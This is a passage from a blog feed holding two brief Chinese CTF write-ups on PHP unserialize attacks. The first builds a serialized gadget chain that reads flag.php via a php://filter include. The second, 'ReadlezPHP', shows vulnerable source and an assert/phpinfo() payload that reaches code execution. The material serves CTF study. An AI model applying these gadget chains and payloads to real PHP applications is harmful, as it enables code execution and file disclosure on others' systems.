<p>1.unserialize时候应该先调用wakeup，为了不替换为index.php，则将$this-&gt;source变为类 $source&#x3D;new Show</p>
<p>2.new 之后可以调用__toString()，可以创建一个,利用construct初始化str来newTest</p>
<p>class Show{<br>    public $source;<br>    public $str;<br>    public function __construct(){<br>   return $this-&gt;str&#x3D;new Test;<br>    }</p>
<p>}</p>
<ol start="3">
<li><p>因为$this-&gt;p &#x3D; array()，使用test 调用invoke</p>
</li>
<li><p>最后利用var 获得包含的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var=&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">   return $this-&gt;str=new Test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = new Modifier;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Show;</span><br><span class="line"></span><br><span class="line">$b=new Show;</span><br><span class="line"></span><br><span class="line">$b-&gt;source=$a;</span><br><span class="line"></span><br><span class="line">var_dump(urlencode(serialize($b)));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
</li>
</ol>
<p><img src="/2022/11/25/ooop/j.jpg" alt="题图"></p>
<p><img src="/2022/11/25/ooop/g.jpg" alt="题图"></p>
]]></content>
  </entry>
  <entry>
    <title>ReadlezPHP</title>
    <url>/2022/11/25/fg/</url>
    <content><![CDATA[<p>1.<img src="/2022/11/25/fg/ghj.jpg" alt="进程图"></p>
<p>观察得到get传参获取源码</p>
<p>2.源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b = &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;source&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure>

<p>观察到echo $b($a);</p>
<p>使用</p>
<p> $this-&gt;a &#x3D; “phpinfo()”;<br> $this-&gt;b &#x3D; “assert”;</p>
<p>3.<img src="/2022/11/25/fg/chicken.jpg" alt="进程图"></p>
<p>获得flag</p>
]]></content>
  </entry>
</search>
